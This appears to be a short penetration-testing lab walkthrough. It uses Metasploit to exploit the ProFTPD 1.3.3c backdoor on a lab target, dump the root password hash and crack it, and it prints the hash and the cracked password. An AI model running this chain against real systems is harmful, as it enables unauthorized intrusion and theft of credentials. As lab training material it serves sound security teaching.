In this lab, run the following auxiliary modules against the target:

- auxiliary/analyze/crack_linux

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1


```
nmap -p 21 --script vuln 192.146.187.3
```


```
use exploit/unix/ftp/proftpd_133c_backdoor
set rhosts 192.146.187.3
exploit
```

```
use post/linux/gather/hashdump
set session 1 
exploit

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash

```

```
use auxiliary/analyze/crack_linux
set sha512 true
exploit


 DB ID  Hash Type    Username  Cracked Password  Method
 -----  ---------    --------  ----------------  ------
 1      sha512crypt  root      password          Single
```